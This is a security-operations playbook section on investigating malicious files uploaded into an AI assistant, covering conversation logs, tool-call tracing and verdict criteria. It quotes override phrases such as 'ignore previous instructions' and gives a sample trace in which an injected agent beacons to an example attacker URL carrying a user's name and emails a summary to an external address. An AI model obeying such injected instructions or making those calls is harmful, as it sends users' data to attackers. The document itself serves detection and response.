# Deep-Dive: Analysing the AI Conversation Context (Prompt, Output, Tool Calls, Downstream Actions)

> Scope note: this fragment feeds the **Investigation**, **Enrichment**, and **Evidence Collection** fields of the master playbook *Malicious File Uploaded Into an AI System*. It does not cover static file analysis (that's a separate deep-dive) — this is purely about what happened *inside the conversation* once the file was in play: what the model was told, what it said back, what it called out to, and what actually happened on the other end of those calls.

## Why the conversation itself is evidence, not just the file

**[STAKEHOLDER]** - A malicious file that just sits in blob storage unread is a low-grade problem. A malicious file whose embedded text got fed into a model that then had tool access (browsing, code execution, file write, email send, ticketing) is a potential automation of the attack — the AI did the clicking. Business risk shifts from "one user might open this" to "the assistant may have already exfiltrated data or executed instructions on the attacker's behalf, at machine speed, across every session that touched the file." Whoever owns the AI platform (product/engineering) and whoever owns data-loss risk (CISO/legal) both need this analysis before anyone can say the incident is contained.

## What to pull from the platform's conversation/audit log

**[ANALYST]** Most AI application platforms (internal chat apps, RAG pipelines, agent frameworks) log a conversation trace distinct from the OS security log. Treat it as its own log source and pull it whole — don't sample.

| Field | Why it matters |
|---|---|
| Conversation/Session ID, User/Account ID | Ties the trace to an identity; check for shared/service accounts |
| Uploaded file reference (hash, storage path) | Correlates to the static-analysis deep-dive |
| Full prompt text (user turn + any system/developer prompt visible) | Reveals whether injected instructions from the file leaked into user-visible context |
| Retrieved/extracted document text actually passed to the model | Distinct from the raw file — this is what the model *saw*; RAG pipelines often truncate or chunk, so the injection may be in a chunk that was never even retrieved |
| Model output, full and unredacted | Did it comply with embedded instructions, refuse, or partially comply? |
| Tool/function call name + parameters, per call, in order | The action sequence — this is the kill chain |
| Tool call result/response | What data came back into context |
| Downstream action confirmation (email sent, ticket created, file written, code executed, HTTP request made) | Proof of execution, not just intent |
| Timestamps (UTC) for each turn and each tool call | Sequencing against network/host logs; watch for clock skew between the AI platform and the SIEM |

## Reading the prompt content for injection

**[ANALYST]** Look for classic prompt-injection phrasing surviving into the extracted-text field: "ignore previous instructions," "disregard the system prompt," "you must now," instructions to fetch a URL, instructions to summarize and email the summary to an external address, or a block of text formatted to look like a system message (fake role headers, fake `<system>` tags) inside a PDF's text layer, DOCX comments, or CSV cell content. Hidden text (white-on-white, zero-font-size, off-page) that renders normally to a human but gets extracted in full by the ingestion pipeline is the pattern to hunt for — the human reviewer never saw what the model saw.

## Tracing tool calls and downstream actions

**[ENGINEERING]** Reconstruct the call chain in order and classify each hop:

```
turn_1: user uploads report.pdf
turn_2: model calls tool "extract_text" -> returns 4,200 chars incl. hidden block
turn_3: model calls tool "web_fetch" -> GET https://drop.example-cdn.net/beacon.php?id=alice.chen
turn_4: model calls tool "send_email" -> to: external-relay@example.net, body: [conversation summary]
turn_5: model responds to user: "Here is your summary..."
```
That sequence is T1204 User Execution (the user's act of uploading/asking for a summary triggers agent action) chaining into T1567 Exfiltration Over Web Service (turn 3, if fetch is outbound to attacker infra) or T1114.003-flavoured mail abuse (turn 4, if the platform's mail tool sends externally without a human approval gate). If the agent has a code-execution sandbox with network egress, correlate sandbox container logs and any host-level telemetry (4688 process creation with parent = sandbox runtime, 4104 script block logging if it shelled out to PowerShell) against the tool-call timestamp — obfuscated payloads decoded and run inside the sandbox map to T1027 and T1059.001/.003 respectively. A tool call that pulls a secondary payload maps to T1105 Ingress Tool Transfer.

## External connections and data accessed

**[ANALYST]** For any `web_fetch`, `browse`, or plugin/connector call: extract destination domain/IP, resolve it, check against threat intel, and separately pull DNS and proxy logs for the AI platform's egress IP around that timestamp (T1071.004 if resolution alone is the signal, T1572/T1090 if there's a tunnel or proxy chain in the path). For any connector call touching internal data (SharePoint, cloud storage, ticketing, CRM): log exactly which objects were opened or listed — this is where T1530 Data from Cloud Storage or T1552.001 Unsecured Credentials in Files becomes relevant if the model was steered into pulling and repeating back credential-bearing files.

## Decision points

**[ANALYST]** True Positive: tool calls or outbound connections to attacker-controlled infrastructure not requested by the user, or model output containing exfiltrated internal data verbatim. Benign Positive: model refused the injected instruction and only echoed it back as quoted text for the user's awareness — no tool call fired. Insufficient Evidence: platform doesn't log full tool parameters (common with third-party plugin marketplaces) or retention already rolled the trace off before triage started — a known and painfully common limitation worth flagging to platform engineering as a logging gap, not closing silently as benign.
